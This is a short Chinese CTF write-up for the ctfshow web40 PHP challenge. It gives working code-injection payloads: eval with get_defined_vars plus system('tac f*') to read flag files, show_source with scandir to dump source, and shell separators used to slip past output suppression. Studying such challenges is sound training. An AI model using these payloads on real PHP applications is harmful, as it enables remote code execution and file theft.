## ctfshow web40 php函数
法1：

```php
get_defined_vars()    # 获取所有系统定义的变量，用户定义的变量，post,get,file等，返回一个数组
next()                # 指向数组中变量的指针
array_pop()           # 弹出数组中最后一个元素
eval()                # 执行表达式或参数字符串命令
```
连起来构造：  
**payload：url/?c=eval(array_pop(next(get_defined_vars())));**  
构造完，不知道他有什么用...他会执行什么我们不知道，他的变量数组最后一个定义的什么，用post给他传一个**1=system("tac f*");** 作为最后一个变量并执行  
 
法2：
```php
getcwd()            #  函数返回当前工作目录。它可以代替pos(localeconv())

localeconv()        #  返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为"."

pos()               # 输出数组第一个元素，不改变指针；

current()           # 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样

scandir()           # 函数返回指定目录中的文件和目录的数组。这里因为参数为"."所以遍历当前目录

array_reverse()     # 数组逆置

next()              # 将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以

show_source()       # 查看源码
```

每个数组中都有一个内部的指针指向它的"当前"元素，初始指向插入到数组中的第一个元素。

提示：该函数不会移动数组内部指针

**payload：url/?c=show_source(next(array_reverse(scandir(getcwd()))));**

**payload：url/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));**



> system($c." >/dev/null 2>&1");      # system执行$c的终端命令  
**>/dev/null 2>&1"** 加上这句后，执行命令但无回显

```bash
; //分号
| //只执行后面那条命令
|| //只执行前面那条命令
& //两条命令都会执行
&& //两条命令都会执行
```
其中在使用GET传值时，&和&&都需要进行url编码  
使用GET给$c传值时，加入这些**用于控制终端命令执行流程**的符号，从而绕过php黑洞
